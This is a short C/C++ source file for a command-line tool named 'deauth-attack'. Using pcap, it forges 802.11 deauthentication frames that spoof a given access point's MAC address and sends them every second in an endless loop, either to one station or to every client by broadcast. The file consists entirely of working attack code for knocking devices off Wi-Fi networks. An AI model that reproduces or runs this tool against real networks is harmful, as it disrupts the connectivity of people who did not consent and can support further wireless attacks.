#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <unistd.h>

#include <cstdio>

#include "mac.h"
#include "radiotap.h"
#include "deauthentication.h"

struct DeauthPacket {
    RadiotapHdr radiotaphdr;
    Deauthentication deauthentication;
    uint16_t wireless = 0x07;
};

void usage(void)
{
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[])
{
    if((argc != 4) && (argc != 3)) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    int res;
    struct pcap_pkthdr* header;

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    DeauthPacket packet;
    packet.deauthentication.transmitter = Mac(argv[2]);
    packet.deauthentication.BSSID = Mac(argv[2]);
    if (argc == 3) {
        packet.deauthentication.receiver = Mac("ff:ff:ff:ff:ff:ff");
    } else {
        packet.deauthentication.receiver = Mac(argv[3]);
    }
    
    while(true) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(DeauthPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("Deauth\n");
        sleep(1);
    }
}